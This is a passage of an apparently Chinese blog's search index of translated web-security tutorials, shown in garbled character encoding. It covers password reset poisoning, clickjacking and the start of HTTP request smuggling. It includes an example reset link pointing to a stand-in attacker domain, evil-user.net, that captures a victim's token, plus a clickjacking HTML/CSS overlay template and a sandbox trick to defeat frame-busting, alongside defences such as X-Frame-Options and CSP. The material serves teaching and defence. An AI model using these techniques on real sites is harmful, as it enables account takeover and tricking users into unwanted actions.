çš„åŠŸèƒ½ã€‚å®ç°è¿™ä¸ªåŠŸèƒ½æœ‰å¥½å‡ ç§æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªæœ€å¸¸è§çš„æ–¹æ³•æ˜¯ï¼š ç”¨æˆ·è¾“å…¥ç”¨æˆ·åæˆ–ç”µå­é‚®ä»¶åœ°å€ï¼Œç„¶åæäº¤å¯†ç é‡ç½®è¯·æ±‚ã€‚ ç½‘ç«™æ£€æŸ¥è¯¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªä¸´æ—¶çš„ã€å”¯ä¸€çš„ã€é«˜ç†µçš„ token ä»¤ç‰Œï¼Œå¹¶åœ¨åç«¯å°†è¯¥ä»¤ç‰Œä¸ç”¨æˆ·çš„å¸æˆ·ç›¸å…³è”ã€‚ ç½‘ç«™å‘ç”¨æˆ·å‘é€ä¸€å°åŒ…å«é‡ç½®å¯†ç é“¾æ¥çš„ç”µå­é‚®ä»¶ã€‚ç”¨æˆ·çš„ token ä»¤ç‰Œä½œä¸º query å‚æ•°åŒ…å«åœ¨ç›¸åº”çš„ URL ä¸­ï¼Œå¦‚ https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9jã€‚ å½“ç”¨æˆ·è®¿é—®æ­¤ URL æ—¶ï¼Œç½‘ç«™ä¼šæ£€æŸ¥æ‰€æä¾›çš„ token ä»¤ç‰Œæ˜¯å¦æœ‰æ•ˆï¼Œå¹¶ä½¿ç”¨å®ƒæ¥ç¡®å®šè¦é‡ç½®çš„å¸æˆ·ã€‚å¦‚æœä¸€åˆ‡æ­£å¸¸ï¼Œç”¨æˆ·å°±å¯ä»¥è®¾ç½®æ–°å¯†ç äº†ã€‚æœ€åï¼Œtoken ä»¤ç‰Œè¢«é”€æ¯ã€‚ ä¸å…¶ä»–ä¸€äº›æ–¹æ³•ç›¸æ¯”ï¼Œè¿™ä¸ªè¿‡ç¨‹è¶³å¤Ÿç®€å•å¹¶ä¸”ç›¸å¯¹å®‰å…¨ã€‚ç„¶è€Œï¼Œå®ƒçš„å®‰å…¨æ€§ä¾èµ–äºè¿™æ ·ä¸€ä¸ªå‰æï¼šåªæœ‰ç›®æ ‡ç”¨æˆ·æ‰èƒ½è®¿é—®ä»–ä»¬çš„ç”µå­é‚®ä»¶æ”¶ä»¶ç®±ï¼Œä»è€Œä½¿ç”¨ä»–ä»¬çš„ token ä»¤ç‰Œã€‚è€Œå¯†ç é‡ç½®ä¸­æ¯’å°±æ˜¯ä¸€ç§çªƒå–æ­¤ token ä»¤ç‰Œä»¥æ›´æ”¹å…¶ä»–ç”¨æˆ·å¯†ç çš„æ–¹æ³•ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/:1:0","tags":[],"title":"Password reset poisoning","uri":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/"},{"categories":["web security"],"content":"å¦‚ä½•æ„é€ ä¸€ä¸ªå¯†ç é‡ç½®ä¸­æ¯’æ”»å‡» å¦‚æœå‘é€ç»™ç”¨æˆ·çš„ URL æ˜¯åŸºäºå¯æ§åˆ¶çš„è¾“å…¥ï¼ˆä¾‹å¦‚ Host å¤´ï¼‰åŠ¨æ€ç”Ÿæˆçš„ï¼Œåˆ™å¯ä»¥æ„é€ å¦‚ä¸‹æ‰€ç¤ºçš„å¯†ç é‡ç½®ä¸­æ¯’æ”»å‡»ï¼š æ”»å‡»è€…æ ¹æ®éœ€è¦è·å–å—å®³è€…çš„ç”µå­é‚®ä»¶åœ°å€æˆ–ç”¨æˆ·åï¼Œå¹¶ä»£è¡¨å—å®³è€…æäº¤å¯†ç é‡ç½®è¯·æ±‚ï¼Œä½†æ˜¯è¿™ä¸ªè¯·æ±‚è¢«ä¿®æ”¹äº† Host å¤´ï¼Œä»¥æŒ‡å‘ä»–ä»¬æ§åˆ¶çš„åŸŸã€‚æˆ‘ä»¬å‡è®¾ä½¿ç”¨çš„æ˜¯ evil-user.net ã€‚ å—å®³è€…æ”¶åˆ°äº†ç½‘ç«™å‘é€çš„çœŸå®çš„å¯†ç é‡ç½®ç”µå­é‚®ä»¶ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªé‡ç½®å¯†ç çš„é“¾æ¥ï¼Œä»¥åŠä¸ä»–ä»¬çš„å¸æˆ·ç›¸å…³è”çš„ token ä»¤ç‰Œã€‚ä½†æ˜¯ï¼ŒURL ä¸­çš„åŸŸåæŒ‡å‘äº†æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼šhttps://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j ã€‚ å¦‚æœå—å®³è€…ç‚¹å‡»äº†æ­¤é“¾æ¥ï¼Œåˆ™å¯†ç é‡ç½®çš„ token ä»¤ç‰Œå°†è¢«ä¼ é€’åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ã€‚ æ”»å‡»è€…ç°åœ¨å¯ä»¥è®¿é—®ç½‘ç«™çš„çœŸå® URL ï¼Œå¹¶ä½¿ç”¨ç›—å–çš„å—å®³è€…çš„ token ä»¤ç‰Œï¼Œå°†ç”¨æˆ·çš„å¯†ç é‡ç½®ä¸ºè‡ªå·±çš„å¯†ç ï¼Œç„¶åå°±å¯ä»¥ç™»å½•åˆ°ç”¨æˆ·çš„å¸æˆ·äº†ã€‚ åœ¨çœŸæ­£çš„æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä¼ªé€ ä¸€ä¸ªå‡çš„è­¦å‘Šé€šçŸ¥æ¥æé«˜å—å®³è€…ç‚¹å‡»é“¾æ¥çš„æ¦‚ç‡ã€‚ å³ä½¿ä¸èƒ½æ§åˆ¶å¯†ç é‡ç½®çš„é“¾æ¥ï¼Œæœ‰æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ Host å¤´å°† HTML æ³¨å…¥åˆ°æ•æ„Ÿçš„ç”µå­é‚®ä»¶ä¸­ã€‚è¯·æ³¨æ„ï¼Œç”µå­é‚®ä»¶å®¢æˆ·ç«¯é€šå¸¸ä¸æ‰§è¡Œ JavaScript ï¼Œä½†å…¶ä»– HTML æ³¨å…¥æŠ€æœ¯å¦‚æ‚¬æŒ‚æ ‡è®°æ”»å‡»å¯èƒ½ä»ç„¶é€‚ç”¨ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/:2:0","tags":[],"title":"Password reset poisoning","uri":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ Clickjacking ( UI redressing )","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"Clickjacking ( UI redressing ) åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯ clickjacking ç‚¹å‡»åŠ«æŒï¼Œå¹¶æè¿°å¸¸è§çš„ç‚¹å‡»åŠ«æŒæ”»å‡»ç¤ºä¾‹ï¼Œä»¥åŠè®¨è®ºå¦‚ä½•é˜²å¾¡è¿™äº›æ”»å‡»ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ç‚¹å‡»åŠ«æŒ ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§åŸºäºç•Œé¢çš„æ”»å‡»ï¼Œé€šè¿‡è¯±å¯¼ç”¨æˆ·ç‚¹å‡»é’“é±¼ç½‘ç«™ä¸­çš„è¢«éšè—äº†çš„å¯æ“ä½œçš„å±é™©å†…å®¹ã€‚ ä¾‹å¦‚ï¼šæŸä¸ªç”¨æˆ·è¢«è¯±å¯¼è®¿é—®äº†ä¸€ä¸ªé’“é±¼ç½‘ç«™ï¼ˆå¯èƒ½æ˜¯ç‚¹å‡»äº†ç”µå­é‚®ä»¶ä¸­çš„é“¾æ¥ï¼‰ï¼Œç„¶åç‚¹å‡»äº†ä¸€ä¸ªèµ¢å–å¤§å¥–çš„æŒ‰é’®ã€‚å®é™…æƒ…å†µåˆ™æ˜¯ï¼Œæ”»å‡»è€…åœ¨è¿™ä¸ªèµ¢å–å¤§å¥–çš„æŒ‰é’®ä¸‹é¢éšè—äº†å¦ä¸€ä¸ªç½‘ç«™ä¸Šå‘å…¶ä»–è´¦æˆ·è¿›è¡Œæ”¯ä»˜çš„æŒ‰é’®ï¼Œè€Œç»“æœå°±æ˜¯ç”¨æˆ·è¢«è¯±éª—è¿›è¡Œäº†æ”¯ä»˜ã€‚è¿™å°±æ˜¯ä¸€ä¸ªç‚¹å‡»åŠ«æŒæ”»å‡»çš„ä¾‹å­ã€‚è¿™é¡¹æŠ€æœ¯å®é™…ä¸Šå°±æ˜¯é€šè¿‡ iframe åˆå¹¶ä¸¤ä¸ªé¡µé¢ï¼ŒçœŸå®æ“ä½œçš„é¡µé¢è¢«éšè—ï¼Œè€Œè¯±éª—ç”¨æˆ·ç‚¹å‡»çš„é¡µé¢åˆ™æ˜¾ç¤ºå‡ºæ¥ã€‚ç‚¹å‡»åŠ«æŒæ”»å‡»ä¸ CSRF æ”»å‡»çš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œç‚¹å‡»åŠ«æŒéœ€è¦ç”¨æˆ·æ‰§è¡ŒæŸç§æ“ä½œï¼Œæ¯”å¦‚ç‚¹å‡»æŒ‰é’®ï¼Œè€Œ CSRF åˆ™æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…æˆ–è€…æ²¡æœ‰è¾“å…¥çš„æƒ…å†µä¸‹ä¼ªé€ æ•´ä¸ªè¯·æ±‚ã€‚ é’ˆå¯¹ CSRF æ”»å‡»çš„é˜²å¾¡æªæ–½é€šå¸¸æ˜¯ä½¿ç”¨ CSRF tokenï¼ˆé’ˆå¯¹ç‰¹å®šä¼šè¯ã€ä¸€æ¬¡æ€§ä½¿ç”¨çš„éšæœºæ•°ï¼‰ã€‚è€Œç‚¹å‡»åŠ«æŒæ— æ³•åˆ™é€šè¿‡ CSRF token ç¼“è§£æ”»å‡»ï¼Œå› ä¸ºç›®æ ‡ä¼šè¯æ˜¯åœ¨çœŸå®ç½‘ç«™åŠ è½½çš„å†…å®¹ä¸­å»ºç«‹çš„ï¼Œå¹¶ä¸”æ‰€æœ‰è¯·æ±‚å‡åœ¨åŸŸå†…å‘ç”Ÿã€‚CSRF token ä¹Ÿä¼šè¢«æ”¾å…¥è¯·æ±‚ä¸­ï¼Œå¹¶ä½œä¸ºæ­£å¸¸è¡Œä¸ºçš„ä¸€éƒ¨åˆ†ä¼ é€’ç»™æœåŠ¡å™¨ï¼Œä¸æ™®é€šä¼šè¯ç›¸æ¯”ï¼Œå·®å¼‚å°±åœ¨äºè¯¥è¿‡ç¨‹å‘ç”Ÿåœ¨éšè—çš„ iframe ä¸­ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"å¦‚ä½•æ„é€ ä¸€ä¸ªåŸºæœ¬çš„ç‚¹å‡»åŠ«æŒæ”»å‡» ç‚¹å‡»åŠ«æŒæ”»å‡»ä½¿ç”¨ CSS åˆ›å»ºå’Œæ“ä½œå›¾å±‚ã€‚æ”»å‡»è€…å°†ç›®æ ‡ç½‘ç«™é€šè¿‡ iframe åµŒå…¥å¹¶éšè—ã€‚ä½¿ç”¨æ ·å¼æ ‡ç­¾å’Œå‚æ•°çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š \u003chead\u003e \u003cstyle\u003e #target_website { position:relative; width:128px; height:128px; opacity:0.00001; z-index:2; } #decoy_website { position:absolute; width:300px; height:400px; z-index:1; } \u003c/style\u003e \u003c/head\u003e ... \u003cbody\u003e \u003cdiv id=\"decoy_website\"\u003e ...decoy web content here... \u003c/div\u003e \u003ciframe id=\"target_website\" src=\"https://vulnerable-website.com\"\u003e \u003c/iframe\u003e \u003c/body\u003e ç›®æ ‡ç½‘ç«™ iframe è¢«å®šä½åœ¨æµè§ˆå™¨ä¸­ï¼Œä½¿ç”¨é€‚å½“çš„å®½åº¦å’Œé«˜åº¦ä½ç½®å€¼å°†ç›®æ ‡åŠ¨ä½œä¸è¯±é¥µç½‘ç«™ç²¾ç¡®é‡å ã€‚æ— è®ºå±å¹•å¤§å°ï¼Œæµè§ˆå™¨ç±»å‹å’Œå¹³å°å¦‚ä½•ï¼Œç»å¯¹ä½ç½®å€¼å’Œç›¸å¯¹ä½ç½®å€¼å‡ç”¨äºç¡®ä¿ç›®æ ‡ç½‘ç«™å‡†ç¡®åœ°ä¸è¯±é¥µé‡å ã€‚z-index å†³å®šäº† iframe å’Œç½‘ç«™å›¾å±‚çš„å †å é¡ºåºã€‚é€æ˜åº¦è¢«è®¾ç½®ä¸ºé›¶ï¼Œå› æ­¤ iframe å†…å®¹å¯¹ç”¨æˆ·æ˜¯é€æ˜çš„ã€‚æµè§ˆå™¨å¯èƒ½ä¼šåŸºäº iframe é€æ˜åº¦è¿›è¡Œé˜ˆå€¼åˆ¤æ–­ä»è€Œè‡ªåŠ¨è¿›è¡Œç‚¹å‡»åŠ«æŒä¿æŠ¤ï¼ˆä¾‹å¦‚ï¼ŒChrome 76 åŒ…å«æ­¤è¡Œä¸ºï¼Œä½† Firefox æ²¡æœ‰ï¼‰ï¼Œä½†æ”»å‡»è€…ä»ç„¶å¯ä»¥é€‰æ‹©é€‚å½“çš„é€æ˜åº¦å€¼ï¼Œä»¥ä¾¿åœ¨ä¸è§¦å‘æ­¤ä¿æŠ¤è¡Œä¸ºçš„æƒ…å†µä¸‹è·å¾—æ‰€éœ€çš„æ•ˆæœã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"é¢„å¡«å†™è¾“å…¥è¡¨å• ä¸€äº›éœ€è¦è¡¨å•å¡«å†™å’Œæäº¤çš„ç½‘ç«™å…è®¸åœ¨æäº¤ä¹‹å‰ä½¿ç”¨ GET å‚æ•°é¢„å…ˆå¡«å……è¡¨å•è¾“å…¥ã€‚ç”±äº GET å‚æ•°åœ¨ URL ä¸­ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥ç›´æ¥ä¿®æ”¹ç›®æ ‡ URL çš„å€¼ï¼Œå¹¶å°†é€æ˜çš„â€œæäº¤â€æŒ‰é’®è¦†ç›–åœ¨è¯±é¥µç½‘ç«™ä¸Šã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"Frame æ‹¦æˆªè„šæœ¬ åªè¦ç½‘ç«™å¯ä»¥è¢« frame ï¼Œé‚£ä¹ˆç‚¹å‡»åŠ«æŒå°±æœ‰å¯èƒ½å‘ç”Ÿã€‚å› æ­¤ï¼Œé¢„é˜²æ€§æŠ€æœ¯çš„åŸºç¡€å°±æ˜¯é™åˆ¶ç½‘ç«™ frame çš„èƒ½åŠ›ã€‚æ¯”è¾ƒå¸¸è§çš„å®¢æˆ·ç«¯ä¿æŠ¤æªæ–½å°±æ˜¯ä½¿ç”¨ web æµè§ˆå™¨çš„ frame æ‹¦æˆªæˆ–æ¸…ç†è„šæœ¬ï¼Œæ¯”å¦‚æµè§ˆå™¨çš„æ’ä»¶æˆ–æ‰©å±•ç¨‹åºï¼Œè¿™äº›è„šæœ¬é€šå¸¸æ˜¯ç²¾å¿ƒè®¾è®¡çš„ï¼Œä»¥ä¾¿æ‰§è¡Œä»¥ä¸‹éƒ¨åˆ†æˆ–å…¨éƒ¨è¡Œä¸ºï¼š æ£€æŸ¥å¹¶å¼ºåˆ¶å½“å‰çª—å£æ˜¯ä¸»çª—å£æˆ–é¡¶éƒ¨çª—å£ ä½¿æ‰€æœ‰ frame å¯è§ã€‚ é˜»æ­¢ç‚¹å‡»å¯ä¸è§çš„ frameã€‚ æ‹¦æˆªå¹¶æ ‡è®°å¯¹ç”¨æˆ·çš„æ½œåœ¨ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚ Frame æ‹¦æˆªæŠ€æœ¯ä¸€èˆ¬ç‰¹å®šäºæµè§ˆå™¨å’Œå¹³å°ï¼Œä¸”ç”±äº HTML çš„çµæ´»æ€§ï¼Œå®ƒä»¬é€šå¸¸ä¹Ÿå¯ä»¥è¢«æ”»å‡»è€…è§„é¿ã€‚ç”±äºè¿™äº›è„šæœ¬ä¹Ÿæ˜¯ JavaScript ï¼Œæµè§ˆå™¨çš„å®‰å…¨è®¾ç½®ä¹Ÿå¯èƒ½ä¼šé˜»æ­¢å®ƒä»¬çš„è¿è¡Œï¼Œç”šè‡³æµè§ˆå™¨ç›´æ¥ä¸æ”¯æŒ JavaScript ã€‚æ”»å‡»è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ HTML5 iframe çš„ sandbox å±æ€§å»è§„é¿ frame æ‹¦æˆªã€‚å½“ iframe çš„ sandbox è®¾ç½®ä¸º allow-forms æˆ– allow-scriptsï¼Œä¸” allow-top-navigation è¢«å¿½ç•¥æ—¶ï¼Œframe æ‹¦æˆªè„šæœ¬å¯èƒ½å°±ä¸èµ·ä½œç”¨äº†ï¼Œå› ä¸º iframe æ— æ³•æ£€æŸ¥å®ƒæ˜¯å¦æ˜¯é¡¶éƒ¨çª—å£ï¼š \u003ciframe id=\"victim_website\" src=\"https://victim-website.com\" sandbox=\"allow-forms\"\u003e\u003c/iframe\u003e å½“ iframe çš„ allow-forms å’Œ allow-scripts è¢«è®¾ç½®ï¼Œä¸” top-level å¯¼èˆªè¢«ç¦ç”¨ï¼Œè¿™ä¼šæŠ‘åˆ¶ frame æ‹¦æˆªè¡Œä¸ºï¼ŒåŒæ—¶å…è®¸ç›®æ ‡ç«™å†…çš„åŠŸèƒ½ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"ç»“åˆä½¿ç”¨ç‚¹å‡»åŠ«æŒä¸ DOM XSS æ”»å‡» åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬æŠŠç‚¹å‡»åŠ«æŒçœ‹ä½œæ˜¯ä¸€ç§ç‹¬ç«‹çš„æ”»å‡»ã€‚ä»å†å²ä¸Šçœ‹ï¼Œç‚¹å‡»åŠ«æŒè¢«ç”¨æ¥æ‰§è¡Œè¯¸å¦‚åœ¨ Facebook é¡µé¢ä¸Šå¢åŠ â€œç‚¹èµâ€ä¹‹ç±»çš„è¡Œä¸ºã€‚ç„¶è€Œï¼Œå½“ç‚¹å‡»åŠ«æŒè¢«ç”¨ä½œå¦ä¸€ç§æ”»å‡»çš„è½½ä½“ï¼Œå¦‚ DOM XSS æ”»å‡»ï¼Œæ‰èƒ½å‘æŒ¥å…¶çœŸæ­£çš„ç ´åæ€§ã€‚å‡è®¾æ”»å‡»è€…é¦–å…ˆå‘ç°äº† XSS æ”»å‡»çš„æ¼æ´ï¼Œåˆ™å®æ–½è¿™ç§ç»„åˆæ”»å‡»å°±å¾ˆç®€å•äº†ï¼Œåªéœ€è¦å°† iframe çš„ç›®æ ‡ URL ç»“åˆ XSS ï¼Œä»¥ä½¿ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æˆ–é“¾æ¥ï¼Œä»è€Œæ‰§è¡Œ DOM XSS æ”»å‡»ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"å¤šæ­¥éª¤ç‚¹å‡»åŠ«æŒ æ”»å‡»è€…æ“ä½œç›®æ ‡ç½‘ç«™çš„è¾“å…¥å¯èƒ½éœ€è¦æ‰§è¡Œå¤šä¸ªæ“ä½œã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯èƒ½å¸Œæœ›è¯±éª—ç”¨æˆ·ä»é›¶å”®ç½‘ç«™è´­ä¹°å•†å“ï¼Œè€Œåœ¨ä¸‹å•ä¹‹å‰è¿˜éœ€è¦å°†å•†å“æ·»åŠ åˆ°è´­ç‰©ç¯®ä¸­ã€‚ä¸ºäº†å®ç°è¿™äº›æ“ä½œï¼Œæ”»å‡»è€…å¯èƒ½ä½¿ç”¨å¤šä¸ªè§†å›¾æˆ– iframe ï¼Œè¿™ä¹Ÿéœ€è¦ç›¸å½“çš„ç²¾ç¡®æ€§ï¼Œæ”»å‡»è€…å¿…é¡»éå¸¸å°å¿ƒã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:6:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²å¾¡ç‚¹å‡»åŠ«æŒæ”»å‡» æˆ‘ä»¬åœ¨ä¸Šæ–‡ä¸­å·²ç»è®¨è®ºäº†ä¸€ç§æµè§ˆå™¨ç«¯çš„é¢„é˜²æœºåˆ¶ï¼Œå³ frame æ‹¦æˆªè„šæœ¬ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…é€šå¸¸ä¹Ÿå¾ˆå®¹æ˜“ç»•è¿‡è¿™ç§é˜²å¾¡ã€‚å› æ­¤ï¼ŒæœåŠ¡ç«¯é©±åŠ¨çš„åè®®è¢«è®¾è®¡äº†å‡ºæ¥ï¼Œä»¥é™åˆ¶æµè§ˆå™¨ iframe çš„ä½¿ç”¨å¹¶å‡è½»ç‚¹å‡»åŠ«æŒçš„é£é™©ã€‚ ç‚¹å‡»åŠ«æŒæ˜¯ä¸€ç§æµè§ˆå™¨ç«¯çš„è¡Œä¸ºï¼Œå®ƒçš„æˆåŠŸä¸å¦å–å†³äºæµè§ˆå™¨çš„åŠŸèƒ½ä»¥åŠæ˜¯å¦éµå®ˆç°è¡Œ web æ ‡å‡†å’Œæœ€ä½³å®è·µã€‚æœåŠ¡ç«¯çš„é˜²å¾¡æªæ–½å°±æ˜¯å®šä¹‰ iframe ç»„ä»¶ä½¿ç”¨çš„çº¦æŸï¼Œç„¶è€Œï¼Œå…¶å®ç°ä»ç„¶å–å†³äºæµè§ˆå™¨æ˜¯å¦éµå®ˆå¹¶å¼ºåˆ¶æ‰§è¡Œè¿™äº›çº¦æŸã€‚æœåŠ¡ç«¯é’ˆå¯¹ç‚¹å‡»åŠ«æŒçš„ä¸¤ç§ä¿æŠ¤æœºåˆ¶åˆ†åˆ«æ˜¯ X-Frame-Options å’Œ Content Security Policy ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:7:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"X-Frame-Options X-Frame-Options æœ€åˆç”± IE8 ä½œä¸ºéå®˜æ–¹çš„å“åº”å¤´å¼•å…¥ï¼Œéšåä¹Ÿåœ¨å…¶ä»–æµè§ˆå™¨ä¸­è¢«è¿…é€Ÿé‡‡ç”¨ã€‚X-Frame-Options å¤´ä¸ºç½‘ç«™æ‰€æœ‰è€…æä¾›äº†å¯¹ iframe ä½¿ç”¨çš„æ§åˆ¶ï¼ˆå°±æ˜¯è¯´ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸èƒ½éšæ„çš„ä½¿ç”¨ iframe åµŒå…¥ä½ æ§åˆ¶çš„ç½‘ç«™ï¼‰ï¼Œæ¯”å¦‚ä½ å¯ä»¥ä½¿ç”¨ deny ç›´æ¥æ‹’ç»æ‰€æœ‰ iframe å¼•ç”¨ä½ çš„ç½‘ç«™ï¼š X-Frame-Options: deny æˆ–è€…ä½¿ç”¨ sameorigin é™åˆ¶ä¸ºåªæœ‰åŒæºç½‘ç«™å¯ä»¥å¼•ç”¨ï¼š X-Frame-Options: sameorigin æˆ–è€…ä½¿ç”¨ allow-from æŒ‡å®šç™½åå•ï¼š X-Frame-Options: allow-from https://normal-website.com X-Frame-Options åœ¨ä¸åŒæµè§ˆå™¨ä¸­çš„å®ç°å¹¶ä¸ä¸€è‡´ï¼ˆæ¯”å¦‚ï¼ŒChrome 76 æˆ– Safari 12 ä¸æ”¯æŒ allow-fromï¼‰ã€‚ç„¶è€Œï¼Œä½œä¸ºå¤šå±‚é˜²å¾¡ç­–ç•¥ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå…¶ä¸ Content Security Policy ç»“åˆä½¿ç”¨æ—¶ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢ç‚¹å‡»åŠ«æŒæ”»å‡»ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:8:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"Content Security Policy Content Security Policy (CSP) å†…å®¹å®‰å…¨ç­–ç•¥æ˜¯ä¸€ç§æ£€æµ‹å’Œé¢„é˜²æœºåˆ¶ï¼Œå¯ä»¥ç¼“è§£ XSS å’Œç‚¹å‡»åŠ«æŒç­‰æ”»å‡»ã€‚CSP é€šå¸¸æ˜¯ç”± web æœåŠ¡ä½œä¸ºå“åº”å¤´è¿”å›ï¼Œæ ¼å¼ä¸ºï¼š Content-Security-Policy: policy å…¶ä¸­çš„ policy æ˜¯ä¸€ä¸ªç”±åˆ†å·åˆ†éš”çš„ç­–ç•¥æŒ‡ä»¤å­—ç¬¦ä¸²ã€‚CSP å‘å®¢æˆ·ç«¯æµè§ˆå™¨æä¾›æœ‰å…³å…è®¸çš„ Web èµ„æºæ¥æºçš„ä¿¡æ¯ï¼Œæµè§ˆå™¨å¯ä»¥å°†è¿™äº›èµ„æºåº”ç”¨äºæ£€æµ‹å’Œæ‹¦æˆªæ¶æ„è¡Œä¸ºã€‚ æœ‰å…³ç‚¹å‡»åŠ«æŒçš„é˜²å¾¡ï¼Œå»ºè®®åœ¨ Content-Security-Policy ä¸­å¢åŠ  frame-ancestors ç­–ç•¥ã€‚ frame-ancestors 'none' ç±»ä¼¼äº X-Frame-Options: deny ï¼Œè¡¨ç¤ºæ‹’ç»æ‰€æœ‰ iframe å¼•ç”¨ã€‚ frame-ancestors 'self' ç±»ä¼¼äº X-Frame-Options: sameorigin ï¼Œè¡¨ç¤ºåªå…è®¸åŒæºå¼•ç”¨ã€‚ ç¤ºä¾‹ï¼š Content-Security-Policy: frame-ancestors 'self'; æˆ–è€…æŒ‡å®šç½‘ç«™ç™½åå•ï¼š Content-Security-Policy: frame-ancestors normal-website.com; ä¸ºäº†æœ‰æ•ˆåœ°é˜²å¾¡ç‚¹å‡»åŠ«æŒå’Œ XSS æ”»å‡»ï¼ŒCSP éœ€è¦è¿›è¡Œä»”ç»†çš„å¼€å‘ã€å®æ–½å’Œæµ‹è¯•ï¼Œå¹¶ä¸”åº”è¯¥ä½œä¸ºå¤šå±‚é˜²å¾¡ç­–ç•¥ä¸­çš„ä¸€éƒ¨åˆ†ä½¿ç”¨ã€‚ ","date":"2021-03-05","objectID":"/translation/web-security/clickjacking/clickjacking/:9:0","tags":[],"title":"web å®‰å…¨ä¹‹ Clickjacking","uri":"/translation/web-security/clickjacking/clickjacking/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ HTTP request smuggling","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"HTTP request smuggling åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯ HTTP è¯·æ±‚èµ°ç§ï¼Œå¹¶æè¿°å¸¸è§çš„è¯·æ±‚èµ°ç§æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ HTTP request smuggling","uri":"/translation/web-security/request-smuggling/http-request-smuggling/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯ HTTP è¯·æ±‚èµ°ç§ HTTP è¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†å¤šä¸ª HTTP è¯·æ±‚åºåˆ—çš„æŠ€æœ¯ã€‚è¯·æ±‚èµ°ç§æ¼æ´å±å®³å¾ˆå¤§ï¼Œå®ƒä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®å¹¶ç›´æ¥å±å®³å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/http-request-smuggling/:1:0","tags":[],"title":"web 